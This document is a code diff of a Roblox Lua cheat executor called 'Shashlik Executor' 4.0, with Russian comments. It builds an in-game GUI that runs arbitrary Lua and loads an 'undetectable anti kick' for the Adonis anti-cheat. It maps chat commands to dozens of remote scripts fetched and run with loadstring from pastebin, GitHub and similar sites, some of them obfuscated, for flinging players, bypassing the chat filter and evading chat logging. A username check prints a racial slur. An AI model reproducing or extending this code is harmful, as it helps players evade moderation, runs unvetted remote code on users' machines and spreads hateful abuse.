@@ -1,80 +1,86 @@
--- help from @Gerdroid
-loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-MoreUNC-13110"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/AdonisAntikick/refs/heads/main/Antikick"))()
+--[[
+Shashlik Executor Source!!! Current Version is: 4.0
+Credits to Maksimilianych228 and Gerdroid
+]]
 
-local player = game.Players.LocalPlayer
+--[[ MAIN SCRIPTS ]]--
+task.spawn(function()
+  --//fast console button
+  loadstring(game:HttpGet("https://pastebin.com/raw/3KcF9M0m"))()
+  
+  --//undetectable anti kick
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/AdonisAntikick/refs/heads/main/Antikick"))()
+end)
+
+--[[ VARIABLES ]]--
+local speaker = game.Players.LocalPlayer
 local camera = workspace.CurrentCamera
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
 local TweenService = game:GetService("TweenService")
+local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
 
--- Создаем основной графический интерфейс
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = game.CoreGui
+--[[ GUI CHECK ]]--
+if CoreGui:FindFirstChild("shashlik") then
+  CoreGui.shashlik:Destroy()
+end
 
--- Создаем основной Frame для GUI
-local frame = Instance.new("Frame")
+--[[ PLAYER DETECTION ]]--
+if speaker.Name == "prespeshnikShashlika" or speaker.Name == "MRP76REBORN" then
+  print("Shashlik Owner Detected!")
+elseif speaker.Name == "Roblox" or speaker.Name == "Skid" then
+  print("Fucking Nigger Ass Retard Detected!")
+end
+
+--[[ SCREEN GUI ]]--
+local shashlik = Instance.new("ScreenGui", CoreGui)
+shashlik.ResetOnSpawn = false
+
+--[[ MAIN FRAME ]]--
+local frame = Instance.new("Frame", shashlik)
 frame.Size = UDim2.new(0, 450, 0, 225)
 frame.Position = UDim2.new(0.5, 0, 0.475, 0)
 frame.AnchorPoint = Vector2.new(0.5, 0.5)
-frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 frame.BorderSizePixel = 0
-frame.Parent = screenGui
 frame.Visible = false
-frame.BackgroundTransparency = 1
+frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+frame.BackgroundTransparency = 0.4
+frame.Active = true
+frame.Draggable = true
 
--- Перетаскивание интерфейса
-local dragging = false
-local dragInput, dragStart, startPos
+local frameCorner = Instance.new("UICorner", frame)
+frameCorner.CornerRadius = UDim.new(0, 20)
 
-local function startDrag(input)
-    if not dragging then
-        dragging = true
-        dragStart = input.Position
-        startPos = frame.Position
-        camera.CameraType = Enum.CameraType.Scriptable -- Блокируем тип камеры
-    end
-end
+local frameShadow = Instance.new("UIStroke", frame)
+frameShadow.Color = Color3.fromRGB(0, 0, 0) 
+frameShadow.Thickness = 5
+frameShadow.Transparency = 0.5 
+frameShadow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border 
 
-local function dragMove(input)
-    if dragging then
-        local delta = input.Position - dragStart
-        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-    end
-end
+--[[ TOPFRAME ]]--
+local topFrame = Instance.new("Frame", frame)
+topFrame.Size = UDim2.new(1, 0, 0, 50)
+topFrame.Position = UDim2.new(0, 0, 0, 0)
+topFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+topFrame.Visible = true -- трах трах труе
 
-local function endDrag(input)
-    if dragging then
-        dragging = false
-        camera.CameraType = Enum.CameraType.Custom -- Восстанавливаем тип камеры
-    end
-end
+local topFrameCorner = Instance.new("UICorner", topFrame)
+topFrameCorner.CornerRadius = UDim.new(0, 20)
 
-frame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        startDrag(input)
-    end
-end)
+--[[ TITLELABEL ]]--
+local titleLabel = Instance.new("TextLabel", topFrame)
+titleLabel.Size = UDim2.new(1, -80, 1, 0)
+titleLabel.Position = UDim2.new(0, 0, 0, 0)
+titleLabel.Text = "shashlik executor 4.0"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.BackgroundTransparency = 1
+titleLabel.TextScaled = true
 
-frame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragMove(input)
-    end
-end)
-
-frame.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        endDrag(input)
-    end
-end)
-
-local gradientFrame = Instance.new("Frame")
-gradientFrame.Size = UDim2.new(1, 18, 1, 18)
-gradientFrame.Position = UDim2.new(0, -9, 0, -9)
-gradientFrame.Parent = frame
-
-local gradient = Instance.new("UIGradient")
-gradient.Parent = gradientFrame
-
+--[[ TITLELABEL GRADIENT ]]--
+local textGradient = Instance.new("UIGradient", titleLabel)
 local function lerpColor(color1, color2, alpha)
     return Color3.new(
         color1.R + (color2.R - color1.R) * alpha,
@@ -82,8 +88,7 @@ local function lerpColor(color1, color2, alpha)
         color1.B + (color2.B - color1.B) * alpha
     )
 end
-
-local function animateGradient()
+local function animateTextGradient()
     local duration = 2
     local steps = 60
     local stepTime = duration / steps
@@ -93,16 +98,16 @@ local function animateGradient()
     while true do
         for i = 0, steps do
             local alpha = i / steps
-            gradient.Color = ColorSequence.new({
+            textGradient.Color = ColorSequence.new({
                 ColorSequenceKeypoint.new(0, lerpColor(color1, color2, alpha)),
                 ColorSequenceKeypoint.new(1, lerpColor(color2, color1, alpha))
             })
             task.wait(stepTime)
         end
-        
+
         for i = 0, steps do
             local alpha = i / steps
-            gradient.Color = ColorSequence.new({
+            textGradient.Color = ColorSequence.new({
                 ColorSequenceKeypoint.new(0, lerpColor(color2, color1, alpha)),
                 ColorSequenceKeypoint.new(1, lerpColor(color1, color2, alpha))
             })
@@ -110,225 +115,216 @@ local function animateGradient()
         end
     end
 end
+task.spawn(animateTextGradient)
 
-task.spawn(animateGradient)
-
-
--- Создаем верхнюю панель
-local topFrame = Instance.new("Frame")
-topFrame.Size = UDim2.new(1, 0, 0, 50)
-topFrame.Position = UDim2.new(0, 0, 0, 0)
-topFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Темно-серый цвет
-topFrame.Parent = frame
-
--- Добавляем заголовок
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Size = UDim2.new(1, -80, 1, 0) -- Укороченный размер
-titleLabel.Position = UDim2.new(0, 0, 0, 0)
-titleLabel.Text = "shashlik executor 3.5" -- Изменено на 3.0
-titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Белый цвет текста
-titleLabel.BackgroundTransparency = 1
-titleLabel.TextScaled = true
-titleLabel.Parent = topFrame
-
--- Создаем многострочное текстовое поле
-local textBox = Instance.new("TextBox")
+--[[ TEXTBOX ]]--
+local textBox = Instance.new("TextBox", frame)
 textBox.Size = UDim2.new(0.73, 0, 0.5, 0)
 textBox.Position = UDim2.new(0, 0, 0, 50)
 textBox.Text = ""
-textBox.PlaceholderText = "send ;cmds and execute" -- Устанавливаем плейсхолдер
+textBox.TextSize = 16
+textBox.PlaceholderText = "Welcome to shashlik exec! Put on textbox ;cmds and execute"
 textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-textBox.BackgroundColor3 = Color3.fromRGB(70, 70, 70) -- Светлее темно-серого
+textBox.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
 textBox.BorderSizePixel = 0
 textBox.TextWrapped = true
+textBox.Font = Enum.Font.Code
 textBox.ClearTextOnFocus = false
 textBox.MultiLine = true
-textBox.Parent = frame
 
--- Функция для создания кнопок
+local textBoxCorner = Instance.new("UICorner", textBox)
+textBoxCorner.CornerRadius = UDim.new(0, 10)
+
+--[[ FPS/PING DISPLAY ]]--
+local statsLabel = Instance.new("TextLabel", textBox)
+statsLabel.Size = UDim2.new(0, 200, 0, 20)
+statsLabel.Position = UDim2.new(1, -190, 1, -20)
+statsLabel.Text = "FPS: 0 PING: 0"
+statsLabel.TextSize = 14
+statsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+statsLabel.BackgroundTransparency = 1
+statsLabel.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json")
+
+local Stats = game:GetService("Stats")
+
+local lastUpdate = 0
+RunService.RenderStepped:Connect(function(deltaTime)
+  task.wait(1.5)
+  local fps = math.floor(1 / deltaTime)
+  local ping = Stats.Network.ServerStatsItem["Data Ping"]:GetValueString()
+  statsLabel.Text = string.format("FPS: %d PING: %s", fps, ping)
+end)
+
+--[[ BUTTONS SETUP ]]--
 local function createButton(size, position, text, color, parent)
-    local button = Instance.new("TextButton")
-    button.Size = size
-    button.Position = position
-    button.Text = text
-    button.BackgroundColor3 = color
-    button.TextColor3 = Color3.fromRGB(255, 255, 255)
-    button.Parent = parent
-    return button
+  local button = Instance.new("TextButton")
+  button.Size = size
+  button.Position = position
+  button.Text = text
+  button.TextSize = 15
+  button.BackgroundColor3 = color
+  button.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json")
+  button.TextColor3 = Color3.fromRGB(255, 255, 255)
+  button.Parent = parent
+  
+  local buttonCorner = Instance.new("UICorner", button)
+  buttonCorner.CornerRadius = UDim.new(0, 10)
+
+  return button
 end
 
--- Устанавливаем размеры и позиции кнопок с одинаковыми промежутками
+--[[ BUTTONS SOUND ]]--
+local function PlayButtonSound()
+  local ButtonClick = Instance.new("Sound", SoundService)
+  ButtonClick.Name = "SHASHLIK_BUTTON_CLICK_LMAO"
+  ButtonClick.SoundId = "rbxasset://sounds/button.wav"
+  ButtonClick.Volume = 5
+  ButtonClick:Play()
+end
+
+--[[ BUTTONS OFFSET ]]--
 local buttonWidth = 0.2
 local buttonSpacing = 0.05
-local buttonOffset = 0.05 -- Смещение вниз для кнопок
-local totalWidth = buttonWidth * 4 + buttonSpacing * 3 -- Общая ширина всех кнопок с промежутками
-local startX = (1 - totalWidth) / 2 -- Начальная позиция по оси X для центрирования
+local buttonOffset = 0.05 
+local totalWidth = buttonWidth * 4 + buttonSpacing * 3
+local startX = (1 - totalWidth) / 2
 local verticalOffset = 0.8
 
+--[[ VARIABLES BUTTONS ]]--
 local executeButton = createButton(UDim2.new(buttonWidth, 0, 0.2, 0), UDim2.new(startX, 0, verticalOffset, 0), "Execute", Color3.fromRGB(128, 128, 128), frame)
 local executeClipboardButton = createButton(UDim2.new(buttonWidth, 0, 0.2, 0), UDim2.new(startX + buttonWidth + buttonSpacing, 0, verticalOffset, 0), "Execute Clipboard", Color3.fromRGB(128, 128, 128), frame)
 local consoleButton = createButton(UDim2.new(buttonWidth, 0, 0.2, 0), UDim2.new(startX + 2 * (buttonWidth + buttonSpacing), 0, verticalOffset, 0), "Console", Color3.fromRGB(128, 128, 128), frame)
 local clearButton = createButton(UDim2.new(buttonWidth, 0, 0.2, 0), UDim2.new(startX + 3 * (buttonWidth + buttonSpacing), 0, verticalOffset, 0), "Clear", Color3.fromRGB(128, 128, 128), frame)
 local copyButton = createButton(UDim2.new(buttonWidth, 0, 0.2, 0), UDim2.new(startX + 3 * (buttonWidth + buttonSpacing), 0, verticalOffset - 0.54, 0), "Copy", Color3.fromRGB(128, 128, 128), frame)
 local pasteButton = createButton(UDim2.new(buttonWidth, 0, 0.2, 0), UDim2.new(startX + 3 * (buttonWidth + buttonSpacing), 0, verticalOffset - 0.28, 0), "Paste", Color3.fromRGB(128, 128, 128), frame)
-
--- Создаем красный крестик в верхнем правом углу
 local closeButton = createButton(UDim2.new(0, 30, 0, 30), UDim2.new(1, -35, 0, 5), "X", Color3.fromRGB(255, 0, 0), topFrame)
+local minusButton = createButton(UDim2.new(0, 30, 0, 30), UDim2.new(1, -70, 0, 5), "–", Color3.fromRGB(255, 255, 0), topFrame)
 
--- Создаем желтую кнопку "минус" рядом с крестиком
-local minusButton = createButton(UDim2.new(0, 30, 0, 30), UDim2.new(1, -70, 0, 5), "-", Color3.fromRGB(255, 255, 0), topFrame)
-minusButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- Белый цвет для символа "минус"
+--[[ TOGGLE BUTTON (BY MINI CAPY) ]]--
+local DragButton = Instance.new("TextButton", shashlik)
+DragButton.Name = "DragButton"
+DragButton.Size = UDim2.new(0, 50, 0, 40)
+DragButton.Position = UDim2.new(0.9, 0, 0.0, 0)
+DragButton.BackgroundColor3 = Color3.fromRGB(0, 116, 217)
+DragButton.BackgroundTransparency = 0.7
+DragButton.Text = "🍢"
+DragButton.TextColor3 = Color3.new(1, 1, 1)
+DragButton.TextSize = 18
+DragButton.BorderSizePixel = 0
+DragButton.Active = true
+DragButton.Draggable = true
 
--- Создаем кнопку "Открыть" без фона
-local openButton = Instance.new("TextButton")
-openButton.Size = UDim2.new(0, 40, 0, 40)
-openButton.Position = UDim2.new(0.9, 0, 0.0, 0)
-openButton.Text = "+"
-openButton.TextColor3 = Color3.fromRGB(0, 255, 0)
-openButton.TextSize = 30
-openButton.Parent = screenGui
-openButton.Visible = true
+local DragButtonCorner = Instance.new("UICorner", DragButton)
+DragButtonCorner.CornerRadius = UDim.new(0.4, 0)
 
--- Перетаскивание кнопки "Открыть"
-local openButtonDragging = false
-local openButtonDragInput, openButtonDragStart, openButtonStartPos
+local DragButtonStroke = Instance.new("UIStroke", DragButton)
+DragButtonStroke.Color = DragButton.BackgroundColor3
+DragButtonStroke.Thickness = 2
+DragButtonStroke.Transparency = 0
+DragButtonStroke.LineJoinMode = Enum.LineJoinMode.Round
+DragButtonStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 
-local function startOpenButtonDrag(input)
-    openButtonDragging = true
-    openButtonDragStart = input.Position
-    openButtonStartPos = openButton.Position
+--[[ EXECUTOR ANIMATION ]]--
+local function fadeIn(frame)
+  frame.Visible = true
+  frame.Size = UDim2.new(0, 0, 0, 0)
+  local tween = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = UDim2.new(0, 450, 0, 225) })
+  tween:Play()
+  tween.Completed:Wait()
+end
+local function fadeOut(frame, callback)
+  local tween = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = UDim2.new(0, 0, 0, 0) })
+  tween:Play()
+  tween.Completed:Wait()
+  frame.Visible = false
+  if callback then callback() end
 end
 
-local function dragOpenButtonMove(input)
-    if openButtonDragging then
-        local delta = input.Position - openButtonDragStart
-        openButton.Position = UDim2.new(openButtonStartPos.X.Scale, openButtonStartPos.X.Offset + delta.X, openButtonStartPos.Y.Scale, openButtonStartPos.Y.Offset + delta.Y)
-    end
-end
-
-local function endOpenButtonDrag(input)
-    openButtonDragging = false
-end
-
-openButton.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        startOpenButtonDrag(input)
-    end
+--[[ TOGGLE BUTTON FUNCTIONALLY ]]--
+DragButton.MouseButton1Click:Connect(function()
+  if frame.Visible then
+    fadeOut(frame)
+  else
+    fadeIn(frame)
+  end
 end)
 
-openButton.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragOpenButtonMove(input)
-    end
-end)
-
-openButton.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        endOpenButtonDrag(input)
-    end
-end)
-
--- Генерируем градиент для кнопки "Открыть"
-local openButtonGradient = Instance.new("UIGradient")
+--[[ TOGGLE BUTTON GRADIENT ]]--
+local openButtonGradient = Instance.new("UIGradient", DragButton)
 openButtonGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)), -- Черный цвет внизу
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 255)) -- Синий цвет вверху
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 255))
 })
-openButtonGradient.Parent = openButton
-
--- Функция для анимации scale up
-local function scaleUp(frame)
-    frame.Visible = true
-    frame.Size = UDim2.new(0, 0, 0, 0) -- Начальный размер 0
-    local tween = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = UDim2.new(0, 450, 0, 225) })
-    tween:Play()
-    tween.Completed:Wait()
-end
-
--- Функция для анимации scale down
-local function scaleDown(frame, callback)
-    local tween = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Size = UDim2.new(0, 0, 0, 0) })
-    tween:Play()
-    tween.Completed:Wait()
-    frame.Visible = false
-    if callback then callback() end
-end
-
 end)
 
--- Обработчик нажатия кнопки Clear
+_G.commands = cmds
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/-1/refs/heads/main/Шайтан%20комманды1"))()
+
 clearButton.MouseButton1Click:Connect(function()
-    textBox.Text = ""
+  textBox.Text = ""
+  PlayButtonSound()
+  clearButton.Text = "Cleared!"
+  task.wait(.1)
+  clearButton.Text = "Clear"
 end)
 
--- Обработчик нажатия кнопки Copy
 copyButton.MouseButton1Click:Connect(function()
-    local textToCopy = textBox.Text
-    setclipboard(textToCopy) -- Копируем текст в буфер обмена
-    print("Текст скопирован в буфер обмена: " .. textToCopy)
+  local textToCopy = textBox.Text
+  setclipboard(textToCopy)
+  print("Text copyed to clipboard: " .. textToCopy)
+  PlayButtonSound()
+  copyButton.Text = "Copyed!"
+  task.wait(.1)
+  copyButton.Text = "Copy"
 end)
 
 pasteButton.MouseButton1Click:Connect(function()
-    local clipboardText = getclipboard()
-    textBox.Text = clipboardText
+  local clipboardText = getclipboard()
+  textBox.Text = clipboardText
+  PlayButtonSound()
+  pasteButton.Text = "Pasted!"
+  task.wait(.1)
+  pasteButton.Text = "Paste"
 end)
 
--- Обработчик нажатия кнопки Close
 closeButton.MouseButton1Click:Connect(function()
-    scaleDown(frame, function()
-        frame:Destroy()
-        openButton:Destroy()
-    end)
+  fadeOut(frame, function()
+    frame:Destroy()
+    shashlik:Destroy()
+    DragButton:Destroy()
+  end)
 end)
 
--- Обработчик нажатия кнопки Minus
 minusButton.MouseButton1Click:Connect(function()
-    scaleDown(frame, function()
-        openButton.Visible = true -- Показываем кнопку "Открыть" после исчезновения
-    end)
+  fadeOut(frame, function()
+    DragButton.Visible = true
+  end)
 end)
 
--- Обработчик нажатия кнопки "Открыть"
-openButton.MouseButton1Click:Connect(function()
-    scaleUp(frame)
-    openButton.Visible = false -- Скрываем кнопку "Открыть"
-end)
-
--- Восстанавливаем тип камеры при закрытии интерфейса
 frame:GetPropertyChangedSignal("Visible"):Connect(function()
-    if not frame.Visible then
-        camera.CameraType = Enum.CameraType.Custom
-    end
+  if not frame.Visible then
+    camera.CameraType = Enum.CameraType.Custom
+  end
 end)
 
 executeClipboardButton.MouseButton1Click:Connect(function()
-    local codeToExecute = getclipboard()
-    local success, errorMessage = pcall(function()
-        loadstring(codeToExecute)()
-    end)
-    if not success then
-        print("Ошибка выполнения кода: " .. errorMessage)
-    end
+  local codeToExecute = getclipboard()
+  local success, errorMessage = pcall(function()
+    loadstring(codeToExecute)()
+  end)
+  PlayButtonSound()
+  if not success then
+    print("" .. errorMessage)
+  end
 end)
 
 consoleButton.MouseButton1Click:Connect(function()
-    game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
-end)
-
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/-1/refs/heads/main/Шайтан%20комманды1"))()
-
-
-player.Chatted:Connect(function(message)
-    if message == ";na" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
-    elseif message == ";iy" then
-        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Infinite-Yield-Reborn-Legacy-21819"))()
-    end
+  PlayButtonSound()
+  StarterGui:SetCore("DevConsoleVisible", true)
 end)
 
 local cc
-cc = game.Players.LocalPlayer.Chatted:Connect(function(msg)
+cc = speaker.Chatted:Connect(function(msg)
     local spaceSplit = msg:split(" ")
     if spaceSplit[1] == ";tptool" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Tptool/refs/heads/main/Tptool"))()
@@ -341,16 +337,34 @@ cc = game.Players.LocalPlayer.Chatted:Connect(function(msg)
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Krunox-13336"))()
     elseif spaceSplit[1] == ";knpc" then
         loadstring(game:HttpGet("https://pastebin.com/raw/DcSXwXqC"))()
+    elseif spaceSplit[1] == ";mvtool" then
+        loadstring(game:HttpGet("https://pastefy.app/Vcuyg09O/raw"))()
+    elseif spaceSplit[1] == ";grtool" then
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/GrabTool/refs/heads/main/GrabToolFix"))()
+    elseif spaceSplit[1] == ";akp3" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/DfjrwJie"))()
+    elseif spaceSplit[1] == ";search" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher"))()
+    elseif spaceSplit[1] == ";sfly" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/8973951821973068216/11374577211057006363/refs/heads/main/supermanfly.luau"))()
     elseif spaceSplit[1] == ";illus" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_11l7Y131YqJjZ31QmV5L8pI23V02b3191sEg26E75472Wl78Vi8870jRv5txZyL1.lua.txt"))()
     elseif spaceSplit[1] == ";hth" then
         loadstring(game:HttpGet("https://pastefy.app/tI5b3OVD/raw"))()
+    elseif spaceSplit[1] == ";rtt" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/RTT-Tool/refs/heads/main/RTT%20Tool"))()
+    elseif spaceSplit[1] == ";bypass" then
+        loadstring(game:HttpGet'https://raw.githubusercontent.com/m1kp0/universal_scripts/refs/heads/main/chat_bypass.lua')()
     elseif spaceSplit[1] == ";acl" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua"))()
     elseif spaceSplit[1] == ";keyb" then
         loadstring(game:HttpGet('https://pastefy.app/Te4dwSw2/raw'))()
+    elseif spaceSplit[1] == ";crouch" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/sebBaBWi"))()
     elseif spaceSplit[1] == ";zomb" then
         loadstring(game:HttpGet("https://pastefy.app/w7KnPY70/raw"))()
+    elseif spaceSplit[1] == ";bp5" then
+        loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/Shashlik-bring-parts/raw/refs/heads/main/Shashlik%20Bring%20Parts%20v2"))()
     elseif spaceSplit[1] == ";fly" then
         loadstring(game:HttpGet("https://pastefy.app/M0N30XXG/raw"))()
     elseif spaceSplit[1] == ";fly2" then
@@ -365,10 +379,16 @@ cc = game.Players.LocalPlayer.Chatted:Connect(function(msg)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/new/refs/heads/main/cmd.lua"))() --команды rochips--
     elseif spaceSplit[1] == ";tfling2" then
         loadstring(game:HttpGet("https://pastebin.com/raw/TXMNj1yy"))()
+    elseif spaceSplit[1] == ";bp4" then
+        loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/Shashlik-bring-parts/raw/refs/heads/main/Shashlik%20bring%20parts"))()
     elseif spaceSplit[1] == ";srp" then
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-SUPER-RING-PARTS-V3-WITH-NO-MESSAGE-26385"))()
     elseif spaceSplit[1] == ";wibtt" then
         loadstring(game:HttpGet('https://raw.githubusercontent.com/BaconBossScript/Crazy/main/Crazy'))()
+    elseif spaceSplit[1] == ";srp4" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Avtor-ring-parts-Updated/refs/heads/main/Avtor%20ring%20parts"))()
+    elseif spaceSplit[1] == ";rp" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Ritual-parts/refs/heads/main/Ritual%20parts%20without%20message"))()
     elseif spaceSplit[1] == ";fc1" then
         loadstring(game:HttpGet('https://pastefy.app/9CDN9Kaj/raw'))()
     elseif spaceSplit[1] == ";fc2" then
@@ -383,8 +403,16 @@ cc = game.Players.LocalPlayer.Chatted:Connect(function(msg)
         loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Nameless-admin-14114"))()
     elseif spaceSplit[1] == ";inf" then
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Infinite-Yield-Reborn-Legacy-21819"))()
+    elseif spaceSplit[1] == ";srp3" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Super-ring-parts-without-massage/refs/heads/main/Super%20ring%20parts"))()
+    elseif spaceSplit[1] == ";rp2" then
+        loadstring(game:HttpGet("https://pastefy.app/hdd1kF9c/raw"))("T.me/AvtorScripts")
+    elseif spaceSplit[1] == ";bhtool" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Blackhole/refs/heads/main/Blackhole"))()
+    elseif spaceSplit[1] == ";ngp" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/Gravity-inverter/refs/heads/main/GI"))()
     elseif spaceSplit[1] == ";na1" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Silly-Exploiter/NamedAdmin/main/bamed%20admen.txt"))()
+        loadstring(game:HttpGet("https://github.com/Silly-Exploiter/NamedAdmin/raw/refs/heads/main/Script"))()
     elseif spaceSplit[1] == ";le" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Lelele-bypasser/refs/heads/main/LeLeBypasser.txt"))()
     elseif spaceSplit[1] == ";srp2" then
@@ -403,7 +431,7 @@ cc = game.Players.LocalPlayer.Chatted:Connect(function(msg)
         writefile(".nonecing", "white")
         loadstring(game:HttpGet("https://glot.io/snippets/gua2ntmbdm/raw/main.lua"))()
     elseif spaceSplit[1] == ";punch" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/fedoratums/Base-Script/Base-Script/fedoratum punch fling"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/punch",true))()
     elseif spaceSplit[1] == ";akp1" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main"))()
     elseif spaceSplit[1] == ";akp2" then
@@ -411,7 +439,9 @@ cc = game.Players.LocalPlayer.Chatted:Connect(function(msg)
     elseif spaceSplit[1] == ";tel3" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/sakupenXD/SakupScripts/main/Telekinesis"))()
     elseif spaceSplit[1] == ";invis" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Luarmor123/community-Y-HUB/refs/heads/main/invisible-button"))()
+        loadstring(game:HttpGet("https://pastebin.com/raw/3Rnd9rHf"))()
+    elseif spaceSplit[1] == ";cunc" then
+      loadstring(game:HttpGet("https://glot.io/snippets/h4d9a8gprw/raw/main.lua"))()
     elseif spaceSplit[1] == ";prox" then
         for i, v in ipairs(game:GetService("Workspace"):GetDescendants()) do
             if v.ClassName == "ProximityPrompt" then
@@ -427,15 +457,37 @@ cc = game.Players.LocalPlayer.Chatted:Connect(function(msg)
             z_c(lonely:HttpGet(z_z .. "" .. z_x))()
             return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
         end
-    else
-        print("wrong command")
     end
 end)
 
+--[[ NOTIFICATION ]]--
 local notificationInfo = {
-    Title = "Welcome!",
-    Image = "",
-    Text = "shashlik executor loaded!", -- Изменено на "shashlik executor loaded!"
-    Duration = "Seconds"
+  Title = "Welcome!",
+  Image = "",
+  Text = "shashlik executor loaded!",
+  Duration = "Seconds",
+  Button1 = "Yay"
 }
-game:GetService("StarterGui"):SetCore("SendNotification", notificationInfo)
+StarterGui:SetCore("SendNotification", notificationInfo)
+
+--[[ INTRO SOUND PLAY ]]--
+local loaded = Instance.new("Sound", SoundService)
+loaded.SoundId = "rbxassetid://9086208751"
+loaded.Volume = 5
+loaded:Play()
+
+--[[ PRINT ANY WORDS ]]--
+getgenv().printing = {
+  helloworld = "Shashlik Executor Succesfully Loaded! 🍢 (v.4.0)",
+  byeworld = "Shashlik Executor Not Loaded! Re-Execute ⛔️ (v.4.0)",
+  fuckworld = "You Blacklisted On Shashlik Executor 💀 (v.4.0)",
+}
+if game:IsLoaded() then
+  print(printing.helloworld)
+elseif not game:IsLoaded() then
+  print(printing.byeworld)
+  shashlik:Destroy()
+elseif speaker.Name == "Roblox" or speaker.Name == "Roblox" then
+  shashlik:Destroy()
+  speaker:kick(printing.fuckworld)
+end
